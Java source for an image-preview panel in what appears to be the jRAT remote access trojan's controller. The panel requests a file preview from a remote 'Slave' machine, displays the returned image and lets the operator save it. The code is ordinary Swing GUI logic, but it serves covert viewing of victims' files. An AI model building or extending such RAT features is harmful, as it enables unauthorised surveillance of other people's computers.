package jrat.module.fs.ui.previews;

import jrat.api.Resources;
import jrat.controller.Slave;
import jrat.controller.ui.panels.PanelImage;
import jrat.module.fs.packets.Packet62PreviewImage;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;


@SuppressWarnings("serial")
public class PanelPreviewImage extends PreviewPanel<BufferedImage> {

	private String file;

	private PanelImage imagePanel;

	public PanelPreviewImage(Slave slave, String f) {
		super(slave, "Image Preview - " + f, Resources.getIcon("image"));
		this.file = f;
		this.slave = slave;

		setLayout(new BorderLayout());

		imagePanel = new PanelImage();
		imagePanel.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent mouseEvent) {
                save();
            }
        });
		add(imagePanel, BorderLayout.CENTER);

		reload();
	}

    private void save() {
        JFileChooser c = new JFileChooser();
        c.showSaveDialog(null);
        File file = c.getSelectedFile();
        if (file != null) {
            try {
                ImageIO.write(imagePanel.getBufferedImage(), "png", file);
            } catch (IOException e) {
                JOptionPane.showMessageDialog(null, "Error saving image: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
                e.printStackTrace();
            }
        }
    }

	public void addData(BufferedImage image) {
        imagePanel.image = image;
        imagePanel.repaint();
    }

	public void reload() {
		slave.addToSendQueue(new Packet62PreviewImage(file));
	}
}
